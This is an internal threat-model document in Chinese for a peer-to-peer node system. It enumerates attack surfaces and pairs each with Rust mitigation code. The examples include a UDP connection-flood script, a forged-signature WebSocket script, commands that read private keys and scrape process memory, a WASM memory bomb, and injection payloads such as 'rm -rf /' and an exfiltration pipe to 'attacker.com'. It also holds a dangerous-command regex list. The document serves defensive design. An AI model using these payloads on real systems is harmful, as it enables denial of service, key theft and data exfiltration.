# CIS v1.1.4 威胁模型文档

> **版本**: 1.1.4  
> **日期**: 2026-02-10  
> **状态**: P0-2 安全基线建立  
> **密级**: 内部使用

---

## 1. 执行摘要

本文档定义 CIS (Cluster of Independent Systems) v1.1.4 的完整威胁模型，包含系统边界分析、威胁参与者画像、攻击面枚举和风险评估。

### 1.1 关键发现

| 威胁等级 | 数量 | 关键威胁 |
|---------|------|---------|
| 🔴 P0 (严重) | 5 | WASM 逃逸、P2P 中间人、私钥泄露、命令注入、ACL 绕过 |
| 🟡 P1 (高) | 6 | DDoS、资源耗尽、配置泄露、重放攻击、权限提升、数据污染 |
| 🟢 P2 (中) | 4 | 信息泄露、审计绕过、协议降级、备份泄露 |

---

## 2. 系统边界分析

### 2.1 网络边界图

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          CIS 系统信任边界                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                        外部威胁区 (不可信)                       │   │
│   │  • 公网流量   • DHT 网络   • 未验证节点   • 恶意扫描             │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                              ▲                                          │
│                              │ 网络边界                                  │
│   ╔═══════════════════════════════════════════════════════════════════╗ │
│   ║                        CIS 信任边界                               ║ │
│   ║                                                                   ║ │
│   ║   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐          ║ │
│   ║   │   节点 A    │◄──►│   节点 B    │◄──►│   节点 C    │          ║ │
│   ║   │  (工作站)   │ P2P │  (服务器)   │ P2P │  (笔记本)   │          ║ │
│   ║   └──────┬──────┘    └──────┬──────┘    └──────┬──────┘          ║ │
│   ║          │                  │                  │                 ║ │
│   ║          ▼                  ▼                  ▼                 ║ │
│   ║   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐          ║ │
│   ║   │  WASM 沙箱  │    │  WASM 沙箱  │    │  WASM 沙箱  │          ║ │
│   ║   │  (半信任)   │    │  (半信任)   │    │  (半信任)   │          ║ │
│   ║   └─────────────┘    └─────────────┘    └─────────────┘          ║ │
│   ║                                                                   ║ │
│   ╚═══════════════════════════════════════════════════════════════════╝ │
│                              │                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                      本地信任区 (完全可信)                       │   │
│   │  • 本地存储   • 私钥文件   • 配置文件   • 审计日志               │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2.2 组件边界定义

| 组件 | 边界类型 | 暴露接口 | 信任级别 |
|------|---------|---------|---------|
| cis-core | 核心库 | 内部 API | 完全信任 |
| cis-node | 节点服务 | 6767, 7676, 7677 | 半信任 |
| cis-gui | GUI 应用 | 本地 IPC | 完全信任 |
| WASM Runtime | 沙箱 | Host 函数 | 不信任 |
| SQLite | 存储层 | SQL 接口 | 完全信任 |
| P2P Transport | 网络层 | QUIC/WebSocket | 不信任 |

---

## 3. 威胁参与者画像

### 3.1 外部攻击者分类

```
┌─────────────────────────────────────────────────────────────────────┐
│                     威胁参与者能力矩阵                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  资源/能力 │    低        中        高        极高                   │
│  ──────────┼────────────────────────────────────────                │
│  动机:低   │ [脚本小子]                                       │
│            │ • 公开工具扫描                                    │
│            │ • 已知 CVE 利用                                   │
│            │ • 自动化攻击脚本                                  │
│  ──────────┼────────────────────────────────────────                │
│  动机:中   │          [网络罪犯]                               │
│            │          • 商业渗透工具                           │
│            │          • 针对性钓鱼                             │
│            │          • 勒索软件部署                           │
│  ──────────┼────────────────────────────────────────                │
│  动机:高   │                    [APT组织]                      │
│            │                    • 0day 研究                    │
│            │                    • 供应链攻击                   │
│            │                    • 高级持续性威胁               │
│  ──────────┼────────────────────────────────────────                │
│  动机:极高 │                              [内部人员]           │
│            │                              • 合法凭证访问       │
│            │                              • 内部知识利用       │
│            │                              • 物理访问权限       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.2 恶意节点场景

**场景 1: 白名单节点被入侵**
- **攻击向量**: 合法节点被攻破后，利用信任关系横向移动
- **影响**: 可传播恶意 ACL 更新、污染网络配置
- **检测难度**: 高（使用合法凭证）
- **缓解措施**: ACL 签名验证 + 版本控制 + 多节点确认

**场景 2: Sybil 攻击**
- **攻击向量**: 创建多个虚假节点 ID，试图控制网络共识
- **影响**: 可能主导网络决策
- **检测难度**: 中
- **缓解措施**: 硬件绑定 DID + 手动白名单审批

**场景 3: 女巫攻击 (Eclipse Attack)**
- **攻击向量**: 控制节点所有连接，隔离目标节点
- **影响**: 阻止节点获取真实网络状态
- **检测难度**: 高
- **缓解措施**: 多源发现 + 连接多样性要求

---

## 4. 攻击面枚举

### 4.1 网络层攻击面

#### 4.1.1 P2P QUIC 传输 (端口 7677)

| 攻击向量 | 风险等级 | 具体攻击方式 | 影响 | 现有缓解 |
|---------|---------|-------------|------|---------|
| 连接洪泛 | 🔴 高 | `while true; do nc -u target 7677; done` | CPU/内存耗尽 | 速率限制 |
| 协议降级 | 🟡 中 | 强制使用 TLS 1.2 而非 1.3 | 加密强度降低 | 版本强制检查 |
| 大型消息 DoS | 🟡 中 | 发送 100MB+ 消息 | 内存耗尽 | 消息大小限制 (待实现) |
| NAT 穿透滥用 | 🟢 低 | 利用 STUN/TURN 做流量放大 | 带宽耗尽 | UPnP 验证 |

**具体攻击示例 - 连接洪泛**:
```bash
# 攻击脚本：每秒创建 1000 个 QUIC 连接
#!/bin/bash
TARGET="victim.cis.node"
PORT=7677

while true; do
    for i in {1..1000}; do
        # 创建半开连接后断开
        (echo "" | nc -q 0 -u $TARGET $PORT &) 
    done
    sleep 1
done
```

**缓解实现**:
```rust
// 在 quic_transport.rs 中实现
pub struct ConnectionRateLimiter {
    connections: DashMap<IpAddr, Vec<Instant>>,
    max_per_minute: usize,
}

impl ConnectionRateLimiter {
    pub fn check_rate(&self, addr: &IpAddr) -> Result<(), ConnectionError> {
        let now = Instant::now();
        let mut entry = self.connections.entry(*addr).or_default();
        
        // 清理过期记录（1分钟前）
        entry.retain(|t| now.duration_since(*t) < Duration::from_secs(60));
        
        if entry.len() >= self.max_per_minute {
            return Err(ConnectionError::RateLimited);
        }
        
        entry.push(now);
        Ok(())
    }
}
```

#### 4.1.2 WebSocket Federation (端口 6767)

| 攻击向量 | 风险等级 | 具体攻击方式 | 影响 |
|---------|---------|-------------|------|
| DID 验证绕过 | 🔴 高 | 伪造 Challenge 响应 | 未授权节点加入 |
| 消息洪泛 | 🟡 中 | 每秒发送 10000+ Matrix 事件 | 消息队列溢出 |
| 长连接保持 | 🟢 低 | 打开连接后不发送心跳 | 连接资源耗尽 |
| HTTP 头注入 | 🟡 中 | `X-Forwarded-For: 127.0.0.1` | IP 验证绕过 |

**具体攻击示例 - DID 验证绕过**:
```python
# 攻击脚本：中间人修改 Challenge 响应
import websocket
import json

def on_message(ws, message):
    data = json.loads(message)
    if data.get('type') == 'challenge':
        # 不实际签名，直接返回伪造响应
        fake_response = {
            'type': 'challenge_response',
            'did': 'did:cis:victim:1234',
            'signature': 'A' * 128  # 伪造签名
        }
        ws.send(json.dumps(fake_response))

ws = websocket.create_connection("ws://target:6767/federation")
ws.on_message = on_message
```

**缓解实现**:
```rust
// 在 websocket_auth.rs 中实现
pub async fn verify_challenge_response(
    challenge: &[u8],
    response: &ChallengeResponse,
) -> Result<(), AuthError> {
    // 1. 验证 DID 格式
    let (node_id, pubkey_hex) = DIDManager::parse_did(&response.did)
        .ok_or(AuthError::InvalidDid)?;
    
    // 2. 解析公钥
    let verifying_key = DIDManager::verifying_key_from_hex(&pubkey_hex)
        .map_err(|_| AuthError::InvalidKey)?;
    
    // 3. 解析签名
    let signature = DIDManager::signature_from_hex(&response.signature)
        .map_err(|_| AuthError::InvalidSignature)?;
    
    // 4. 验证签名
    if !DIDManager::verify(&verifying_key, challenge, &signature) {
        return Err(AuthError::SignatureMismatch);
    }
    
    // 5. 检查防重放（确保 challenge 未被使用过）
    if CHALLENGE_STORE.contains(&response.challenge_hash).await {
        return Err(AuthError::ReplayDetected);
    }
    
    Ok(())
}
```

#### 4.1.3 Matrix Client API (端口 7676)

| 攻击向量 | 风险等级 | 具体攻击方式 | 影响 |
|---------|---------|-------------|------|
| Token 泄露利用 | 🔴 高 | 窃取 ~/.cis/matrix_token | 完全账户控制 |
| API 滥用 | 🟡 中 | 无限创建 room/发送消息 | 存储耗尽 |
| 输入注入 | 🔴 高 | `"room_name": "'; DROP TABLE rooms; --"` | SQL 注入 |

#### 4.1.4 mDNS 发现 (端口 5353)

| 攻击向量 | 风险等级 | 具体攻击方式 | 影响 |
|---------|---------|-------------|------|
| 信息泄露 | 🟡 中 | 监听局域网 mDNS 广播 | 获取节点 IP/服务信息 |
| 欺骗攻击 | 🟢 低 | 伪造 mDNS 响应指向恶意节点 | 连接劫持 |

### 4.2 应用层攻击面

#### 4.2.1 DID 身份系统攻击树

```
                            DID 身份攻击
                                 │
        ┌────────────────────────┼────────────────────────┐
        ▼                        ▼                        ▼
    私钥窃取               助记词恢复               签名伪造
        │                        │                        │
    ┌───┴───┐                ┌───┴───┐                ┌───┴───┐
    ▼       ▼                ▼       ▼                ▼       ▼
内存转储   文件读取      暴力破解   社会工程      算法攻击   实现漏洞
    │       │                │       │                │       │
  缓解    缓解              缓解    缓解             缓解    缓解
─────────────────────────────────────────────────────────────────
• Rust 安全    • 文件权限 0600    • Argon2id     • Ed25519
• 零拷贝       • 密钥加密存储     • 助记词加密   • 标准库实现
```

**具体攻击示例 - 私钥文件读取**:
```bash
# 攻击条件：获得系统普通用户权限
# 攻击脚本：读取 CIS 私钥文件
cat ~/.cis/node.key  # 如果权限配置错误，可直接读取
strings /proc/$(pgrep cis-node)/mem | grep -E "[a-f0-9]{64}"  # 内存提取
```

**缓解实现**:
```rust
// 在 identity/did.rs 中已实现的保护
impl DIDManager {
    pub fn load_or_generate(path: &Path, node_id: impl Into<String>) -> Result<Self> {
        // ... 加载逻辑 ...
        
        // 设置权限为仅所有者可读写 (0o600)
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(path.with_extension("key"))?.permissions();
            perms.set_mode(0o600);
            fs::set_permissions(path.with_extension("key"), perms)?;
        }
        
        Ok(manager)
    }
}
```

#### 4.2.2 ACL 系统攻击面

| 攻击类型 | 风险等级 | 攻击向量 | 影响 |
|---------|---------|---------|------|
| 版本回滚 | 🔴 高 | 传播 version=1 的旧 ACL | 恢复已删除的黑名单项 |
| 签名伪造 | 🔴 高 | 伪造 ACL 更新签名 | 传播恶意配置 |
| 权限提升 | 🟡 中 | 修改自身 ACL 获得更高权限 | 绕过访问控制 |
| 配置污染 | 🟡 中 | 被入侵节点传播有害配置 | 全网配置损坏 |

**具体攻击示例 - ACL 版本回滚**:
```rust
// 恶意节点发送的旧版本 ACL
let malicious_acl = NetworkAcl {
    version: 1,  // 回滚到早期版本
    whitelist: vec![attacker_did],  // 移除合法节点
    blacklist: vec![],  // 清空黑名单
    signature: Some(valid_signature),  // 使用旧签名
    ..Default::default()
};
```

**缓解实现**:
```rust
// 在 network/acl.rs 中实现版本保护
impl NetworkAcl {
    pub fn merge_from_peer(&mut self, peer_acl: &NetworkAcl, peer_did: &str) -> Result<(), AclError> {
        // 1. 验证签名
        peer_acl.verify().map_err(|_| AclError::InvalidSignature)?;
        
        // 2. 检查版本单调性
        if peer_acl.version <= self.version {
            return Err(AclError::StaleVersion {
                received: peer_acl.version,
                current: self.version,
            });
        }
        
        // 3. 检查更新者权限（只能由白名单节点更新）
        if !self.is_whitelisted(peer_did) {
            return Err(AclError::UnauthorizedUpdater);
        }
        
        // 4. 应用更新
        self.whitelist = peer_acl.whitelist.clone();
        self.blacklist = peer_acl.blacklist.clone();
        self.version = peer_acl.version;
        self.updated_at = now();
        
        Ok(())
    }
}
```

#### 4.2.3 WASM 沙箱攻击面

```
┌─────────────────────────────────────────────────────────────────────┐
│                     WASM 沙箱攻击向量                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. 沙箱逃逸 (风险: 🔴 高)                                          │
│     ├── Host 函数漏洞利用                                           │
│     │   └── 攻击：通过越界读写突破线性内存                          │
│     │   └── 代码：memory.write(0xFFFFFFFF, shellcode)               │
│     │                                                               │
│     ├── WASI 能力绕过                                               │
│     │   └── 攻击：利用 path_open 访问沙箱外文件                     │
│     │   └── 代码：wasi::path_open("/../../../etc/passwd")           │
│     │                                                               │
│     └── 类型混淆攻击                                                │
│         └── 攻击：伪造 vtable 调用任意 Host 函数                    │
│         └── 代码：*(void**)(fake_obj) = system; fake_obj->call()    │
│                                                                     │
│  2. 资源耗尽 (风险: 🟡 中)                                          │
│     ├── 内存炸弹                                                    │
│     │   └── 攻击：无限内存分配                                      │
│     │   └── 代码：while(true) { vec.push(0); }                      │
│     │                                                               │
│     ├── CPU 炸弹                                                    │
│     │   └── 攻击：无限循环/复杂计算                                 │
│     │   └── 代码：while(true) { hash(hash(data)); }                 │
│     │                                                               │
│     └── 表/全局变量耗尽                                             │
│         └── 攻击：创建大量表项                                      │
│         └── 代码：table.grow(1000000);                              │
│                                                                     │
│  3. 数据泄露 (风险: 🟡 中)                                          │
│     ├── 侧信道攻击                                                  │
│     │   └── 攻击：通过执行时间推断其他 Skill 数据                   │
│     │                                                               │
│     └── Host 函数返回信息泄露                                       │
│         └── 攻击：分析错误消息获取内部状态                          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**具体攻击示例 - WASM 内存炸弹**:
```rust
// malicious_skill.rs
#[no_mangle]
pub extern "C" fn skill_init() {
    // 尝试分配 10GB 内存
    let mut big_vec: Vec<u8> = Vec::new();
    loop {
        big_vec.extend_from_slice(&[0u8; 1024 * 1024]); // 每次 1MB
    }
}
```

**缓解实现**:
```rust
// 在 wasm/runtime.rs 中已实现
pub struct WasmSkillInstance {
    instance: Instance,
    store: Arc<Mutex<Store>>,
    memory: Memory,
    execution_timeout: Duration,
    created_at: Instant,
}

impl WasmSkillInstance {
    fn check_timeout(&self) -> Result<()> {
        let elapsed = self.created_at.elapsed();
        if elapsed > self.execution_timeout {
            return Err(CisError::wasm(
                format!("Execution timeout: {:?} exceeded limit of {:?}", 
                    elapsed, self.execution_timeout)
            ));
        }
        Ok(())
    }
    
    /// 内存使用监控
    pub fn memory_usage<S: wasmer::AsStoreRef>(&self, store: &S) -> usize {
        self.memory.view(store).data_size() as usize
    }
}

// 资源限制器
pub struct ResourceLimiter {
    max_memory: usize,        // 128MB
    max_table_elements: u32,  // 1024
    max_execution_time: Duration, // 30s
}

impl wasmer::ResourceLimiter for ResourceLimiter {
    fn memory_growing(&mut self, _current: usize, desired: usize, _maximum: Option<usize>) -> bool {
        desired <= self.max_memory
    }
    
    fn table_growing(&mut self, _current: u32, desired: u32, _maximum: Option<u32>) -> bool {
        desired <= self.max_table_elements
    }
}
```

### 4.3 数据层攻击面

#### 4.3.1 SQLite 数据库攻击面

| 攻击类型 | 风险等级 | 攻击向量 | 现有保护 |
|---------|---------|---------|---------|
| SQL 注入 | 🟢 低 | `"1 OR 1=1"` | 参数化查询 (rusqlite) |
| 文件读取 | 🟡 中 | 复制 `~/.cis/data/core.db` | 文件权限 0600 |
| 加密破解 | 🟡 中 | 暴力破解 ChaCha20 密钥 | ChaCha20-Poly1305 |
| 备份泄露 | 🔴 高 | 备份文件未加密 | 加密备份 (待实现) |

#### 4.3.2 配置文件攻击面

```
敏感文件清单:
~/.cis/
├── config.toml          [权限: 0600]  风险: 中 (含 API 密钥)
├── node.key             [权限: 0600]  风险: 极高 (私钥)
├── network_acl.toml     [权限: 0600]  风险: 高 (访问控制)
└── data/
    └── core.db          [权限: 0600]  风险: 高 (加密数据库)

攻击向量:
1. 权限错误配置 (chmod 644) → 其他用户可读
2. 备份文件泄露 (config.toml~) → 历史版本暴露
3. 符号链接攻击 → 写入攻击者控制的文件
4. 竞态条件 → 在验证和使用之间修改
```

### 4.4 Agent 层攻击面

#### 4.4.1 Agent 命令执行攻击

| 攻击向量 | 风险等级 | 具体攻击方式 | 影响 |
|---------|---------|-------------|------|
| 命令注入 | 🔴 高 | `"; rm -rf /; echo "` | 任意命令执行 |
| 路径遍历 | 🔴 高 | `"cat ../../../etc/passwd"` | 文件读取 |
| 环境变量注入 | 🟡 中 | `LD_PRELOAD=/tmp/evil.so` | 代码注入 |
| 管道链攻击 | 🟡 中 | `"cmd | nc attacker.com 9999"` | 数据外泄 |

**具体攻击示例 - 命令注入**:
```rust
// 危险的 Agent 实现
async fn execute_dangerous(prompt: &str) -> Result<String> {
    // 假设 prompt 来自 LLM 输出，可能包含恶意内容
    let cmd = format!("echo '{}' | processor", prompt);
    // 如果 prompt = "'; rm -rf /; echo '", 将导致灾难
    let output = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(&cmd)
        .output()
        .await?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

**缓解实现**:
```rust
// 在 agent/executor.rs 中实现命令白名单
lazy_static! {
    static ref ALLOWED_COMMANDS: Vec<Regex> = vec![
        Regex::new(r"^git\s+(status|diff|log|show)\b").unwrap(),
        Regex::new(r"^cargo\s+(build|test|check|clippy)\b").unwrap(),
        Regex::new(r"^ls\s+-[la]+\s+[\w./-]+$").unwrap(),
        Regex::new(r"^cat\s+[\w./-]+$").unwrap(),
        // ... 其他安全命令
    ];
    
    static ref DANGEROUS_PATTERNS: Vec<Regex> = vec![
        Regex::new(r"[;&|`$]").unwrap(),          // 命令分隔符和替换
        Regex::new(r"<\s*/dev/\w+").unwrap(),     // 设备读取
        Regex::new(r">\s*/[\w/]+").unwrap(),     // 文件写入
        Regex::new(r"\b(rm|dd|mkfs|fdisk)\b").unwrap(), // 危险命令
        Regex::new(r"\b(wget|curl)\s+.*\|").unwrap(),  // 管道下载
        Regex::new(r"\$\(\s*").unwrap(),         // 命令替换
        Regex::new(r"`").unwrap(),                // 反引号替换
    ];
}

pub struct CommandValidator;

impl CommandValidator {
    pub fn validate(command: &str) -> Result<(), SecurityError> {
        // 1. 检查危险模式
        for pattern in DANGEROUS_PATTERNS.iter() {
            if pattern.is_match(command) {
                return Err(SecurityError::DangerousPattern(
                    pattern.as_str().to_string()
                ));
            }
        }
        
        // 2. 检查白名单
        if !ALLOWED_COMMANDS.iter().any(|re| re.is_match(command)) {
            return Err(SecurityError::NotInWhitelist);
        }
        
        Ok(())
    }
}
```

---

## 5. 威胁风险评估

### 5.1 风险矩阵

```
                    影响
                      ^
                 极高 │  [私钥泄露]     [MITM]         [WASM逃逸]
                      │               [ACL污染]
                 高   │  [配置泄露]     [命令注入]     [DoS]
                      │               [数据污染]
                 中   │  [审计绕过]     [重放攻击]     [资源耗尽]
                      │               [信息泄露]
                 低   │  [协议降级]     [备份泄露]     [mDNS欺骗]
                      │
                      └───────────────────────────────────────────> 可能性
                           低              中              高
```

### 5.2 P0 威胁详细分析

#### T-P0.1: WASM 沙箱逃逸
- **攻击向量**: 通过 Host 函数漏洞或 WASI 能力绕过
- **可能性**: 中（需要 WASM 知识）
- **影响**: 极高（完全系统控制）
- **风险等级**: 🔴 严重
- **缓解状态**: 部分实施（内存限制已实施，WASI 能力限制待完善）

#### T-P0.2: P2P 中间人攻击
- **攻击向量**: 拦截未加密的 P2P 通信
- **可能性**: 高（网络嗅探容易）
- **影响**: 极高（数据篡改/窃取）
- **风险等级**: 🔴 严重
- **缓解状态**: 已实施（Noise Protocol XX 模式）

#### T-P0.3: 私钥/助记词泄露
- **攻击向量**: 文件读取、内存转储、备份窃取
- **可能性**: 中（需要系统访问权限）
- **影响**: 极高（身份伪造）
- **风险等级**: 🔴 严重
- **缓解状态**: 已实施（文件权限 0600，内存安全）

#### T-P0.4: Agent 命令注入
- **攻击向量**: LLM 输出未过滤直接执行
- **可能性**: 高（依赖 LLM 安全）
- **影响**: 极高（任意命令执行）
- **风险等级**: 🔴 严重
- **缓解状态**: 待实施（命令白名单框架设计中）

#### T-P0.5: ACL 绕过
- **攻击向量**: 签名伪造、版本回滚、同步欺骗
- **可能性**: 低（需要加密知识）
- **影响**: 高（未授权访问）
- **风险等级**: 🔴 严重
- **缓解状态**: 已实施（Ed25519 签名，版本控制）

### 5.3 P1 威胁详细分析

| 威胁 ID | 威胁名称 | 攻击向量 | 风险等级 | 缓解状态 |
|--------|---------|---------|---------|---------|
| T-P1.1 | DDoS 攻击 | 连接/消息洪泛 | 🟡 高 | 部分实施 |
| T-P1.2 | 资源耗尽 | 无限循环、内存炸弹 | 🟡 高 | 已实施 |
| T-P1.3 | 配置泄露 | 文件权限错误、备份 | 🟡 高 | 待完善 |
| T-P1.4 | 重放攻击 | 重放旧消息 | 🟡 高 | 已实施 |
| T-P1.5 | 权限提升 | 利用配置缺陷 | 🟡 高 | 待评估 |
| T-P1.6 | 数据污染 | 恶意节点传播 | 🟡 高 | 部分实施 |

---

## 6. 残余风险声明

以下风险在当前架构下无法完全消除，需要用户意识和额外防护：

### 6.1 物理访问风险
- **风险**: 冷启动攻击可能获取内存中的密钥
- **缓解**: 使用全盘加密、启用安全启动
- **用户意识**: 保护物理设备安全

### 6.2 供应链风险
- **风险**: 依赖的 Rust crate 可能存在漏洞
- **缓解**: `cargo audit` 定期扫描、锁定依赖版本
- **用户意识**: 及时更新安全补丁

### 6.3 侧信道风险
- **风险**: 时序分析可能泄露信息
- **缓解**: 常量时间加密操作（部分实施）
- **用户意识**: 在高度敏感环境使用专用硬件

### 6.4 社会工程风险
- **风险**: 用户可能被欺骗执行恶意操作
- **缓解**: 安全培训、操作确认机制
- **用户意识**: 警惕可疑请求

---

## 7. 威胁模型维护

### 7.1 更新触发条件
- 新功能发布
- 安全事件
- 架构变更
- 威胁情报更新

### 7.2 审查周期
- **全面审查**: 每季度
- **增量更新**: 每月
- **紧急更新**: 安全事件后 24 小时内

---

## 附录 A: 威胁编号索引

| 编号 | 威胁名称 | 章节 | 优先级 |
|-----|---------|------|-------|
| T-P0.1 | WASM 沙箱逃逸 | 4.2.3 | P0 |
| T-P0.2 | P2P 中间人攻击 | 4.1.1 | P0 |
| T-P0.3 | 私钥/助记词泄露 | 4.2.1 | P0 |
| T-P0.4 | Agent 命令注入 | 4.4.1 | P0 |
| T-P0.5 | ACL 绕过 | 4.2.2 | P0 |
| T-P1.1 | DDoS 攻击 | 4.1.1 | P1 |
| T-P1.2 | 资源耗尽 | 4.2.3 | P1 |
| T-P1.3 | 配置泄露 | 4.3.2 | P1 |
| T-P1.4 | 重放攻击 | 4.1.2 | P1 |
| T-P1.5 | 权限提升 | 4.2.2 | P1 |
| T-P1.6 | 数据污染 | 4.2.2 | P1 |

---

**文档维护**: CIS 安全团队  
**下次审查**: 2026-03-10  
**变更记录**: 
- 2026-02-10: 初始版本，P0-2 安全基线建立
